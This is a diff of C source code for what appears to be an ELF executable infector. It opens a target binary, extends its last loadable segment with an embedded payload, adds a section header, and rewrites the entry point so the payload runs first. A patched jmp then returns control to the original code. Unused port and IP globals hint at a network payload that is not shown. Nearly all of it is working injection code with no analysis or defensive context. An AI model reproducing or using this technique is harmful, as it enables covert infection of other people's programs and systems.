@@ -18,11 +18,13 @@
 #define CDECL_NORM(x) _ ## x
 #endif /* __APPLE__ */
 
-extern uint8_t CDECL_NORM(payload);
+// extern uint8_t CDECL_NORM(payload);
 extern uint64_t CDECL_NORM(payload_size);
 
-#define payload_p &CDECL_NORM(payload)
+// #define payload_p &CDECL_NORM(payload)
 #define payload_size_p CDECL_NORM(payload_size)
+
+void payload(void);
 
 uint16_t port = 0;
 uint32_t addr_ip = 0;
@@ -33,62 +35,62 @@ int main(void) {
 	printf("port: %#x %#x\n", port, addr_ip);
 
 	int fd = open("testprog", O_RDWR);
-    if (fd == -1) {
-        perror("open");
-        exit(EXIT_FAILURE);
-    }
+	if (fd == -1) {
+	    perror("open");
+	    exit(EXIT_FAILURE);
+	}
 
-    struct stat st;
-    if (fstat(fd, &st) == -1) {
-        perror("fstat");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+	struct stat st;
+	if (fstat(fd, &st) == -1) {
+	    perror("fstat");
+	    close(fd);
+	    exit(EXIT_FAILURE);
+	}
 
-    size_t filesize = st.st_size;
-    size_t new_filesize = filesize + payload_size_p + sizeof(Elf64_Shdr);
-    if (ftruncate(fd, new_filesize) == -1) {
-        perror("ftruncate");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+	size_t filesize = st.st_size;
+	size_t new_filesize = filesize + payload_size_p + sizeof(Elf64_Shdr);
+	if (ftruncate(fd, new_filesize) == -1) {
+	    perror("ftruncate");
+	    close(fd);
+	    exit(EXIT_FAILURE);
+	}
 
-    uint8_t *map = mmap(NULL, new_filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-    if (map == MAP_FAILED) {
-        perror("mmap");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+	uint8_t *map = mmap(NULL, new_filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (map == MAP_FAILED) {
+	    perror("mmap");
+	    close(fd);
+	    exit(EXIT_FAILURE);
+	}
 
-    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
-    Elf64_Phdr *phdrs = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
-    Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
+	Elf64_Phdr *phdrs = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
+	Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
 
-    // Find the last loadable segment
-    Elf64_Phdr *last_loadable_phdr = NULL;
-    for (int i = 0; i < ehdr->e_phnum; ++i) {
-        if (phdrs[i].p_type == PT_LOAD) {
-            last_loadable_phdr = &phdrs[i];
-        }
-    }
+	// Find the last loadable segment
+	Elf64_Phdr *last_loadable_phdr = NULL;
+	for (int i = 0; i < ehdr->e_phnum; ++i) {
+	    if (phdrs[i].p_type == PT_LOAD) {
+	        last_loadable_phdr = &phdrs[i];
+	    }
+	}
 
-    if (!last_loadable_phdr) {
-        fprintf(stderr, "No loadable segment found\n");
-        munmap(map, new_filesize);
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+	if (!last_loadable_phdr) {
+	    fprintf(stderr, "No loadable segment found\n");
+	    munmap(map, new_filesize);
+	    close(fd);
+	    exit(EXIT_FAILURE);
+	}
 
-    // Find the last section in the last loadable segment
-    Elf64_Shdr *last_section_in_segment = NULL;
+	// Find the last section in the last loadable segment
+	Elf64_Shdr *last_section_in_segment = NULL;
 	int last_section_in_segment_index = 0;
-    for (int i = 0; i < ehdr->e_shnum; ++i) {
-        if (shdrs[i].sh_addr >= last_loadable_phdr->p_vaddr &&
-            shdrs[i].sh_addr < last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz) {
-            last_section_in_segment = &shdrs[i];
+	for (int i = 0; i < ehdr->e_shnum; ++i) {
+	    if (shdrs[i].sh_addr >= last_loadable_phdr->p_vaddr &&
+	        shdrs[i].sh_addr < last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz) {
+	        last_section_in_segment = &shdrs[i];
 			last_section_in_segment_index = i;
-        }
-    }
+	    }
+	}
 
 	last_section_in_segment_index += 1;
 
@@ -99,13 +101,13 @@ int main(void) {
 		exit(EXIT_FAILURE);
 	}
 
-    // Calculate new section header and data offsets
-    Elf64_Off new_section_offset = last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz;
-    Elf64_Addr new_section_addr = last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz;
+	// Calculate new section header and data offsets
+	Elf64_Off new_section_offset = last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz;
+	Elf64_Addr new_section_addr = last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz;
 
-    // Update the last loadable segment sizes
-    last_loadable_phdr->p_filesz += payload_size_p;
-    last_loadable_phdr->p_memsz += payload_size_p;
+	// Update the last loadable segment sizes
+	last_loadable_phdr->p_filesz += payload_size_p;
+	last_loadable_phdr->p_memsz += payload_size_p;
 
 	// leave space for the new section data and copy the payload
 	memmove(map + new_section_offset + payload_size_p, map + new_section_offset, filesize - new_section_offset);
@@ -160,7 +162,7 @@ int main(void) {
 		printf("shdrs[%d].sh_offset: %#lx\n", i, shdrs[i].sh_offset);
 	}
 
-    // Create new section header
+	// Create new section header
 	Elf64_Shdr new_shdr = {
 		.sh_name = 0,
 		.sh_type = SHT_PROGBITS,
@@ -176,8 +178,8 @@ int main(void) {
 
 	memcpy(shdrs + last_section_in_segment_index, &new_shdr, sizeof(Elf64_Shdr));
 
-    // Update section header string table index
-    ehdr->e_shstrndx += 1;
+	// Update section header string table index
+	ehdr->e_shstrndx += 1;
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
@@ -189,28 +191,28 @@ int main(void) {
 	}
 
 	// Update the entry point
-    Elf64_Addr old_entry_point = ehdr->e_entry;
-    ehdr->e_entry = new_section_addr;
+	Elf64_Addr old_entry_point = ehdr->e_entry;
+	ehdr->e_entry = new_section_addr;
 	
-    // // Calculate the relative jump offset to the old entry point
-    int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
+	// // Calculate the relative jump offset to the old entry point
+	int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
 	printf("offset to old: %#lx\n", jump_offset);
 
-    // // Write the relative jump instruction at the end of the payload
-    size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
-    *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
-    memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+	// // Write the relative jump instruction at the end of the payload
+	size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
+	*((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
+	memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
 	}
 
-    // Cleanup
-    if (munmap(map, new_filesize) == -1) {
-        perror("munmap");
-    }
+	// Cleanup
+	if (munmap(map, new_filesize) == -1) {
+	    perror("munmap");
+	}
 
-    close(fd);
+	close(fd);
 
 	return 0;
 }
